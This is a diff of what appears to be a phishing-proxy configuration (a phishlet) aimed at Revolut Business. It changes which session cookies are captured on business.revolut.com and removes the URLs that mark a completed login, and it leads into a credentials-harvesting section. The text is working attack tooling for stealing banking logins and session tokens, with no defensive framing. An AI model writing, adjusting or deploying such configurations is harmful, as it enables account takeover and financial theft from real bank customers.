@@ -11,15 +11,8 @@ sub_filters:
   - {triggers_on: 'business.revolut.com', orig_sub: 'assets', domain: 'revolut.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
 
 auth_tokens:
-  - domain: '.business.revolut.com'
-    keys: ['.*,regexp']
   - domain: 'business.revolut.com'
-    keys: ['.*,regexp']
-  - domain: '.revolut.com'
-    keys: ['.*,regexp']
-auth_urls:
-  - '/overview'
-  - '/api/user/current'
+    keys: ['token','.*,regexp']
 
 credentials:
   username:
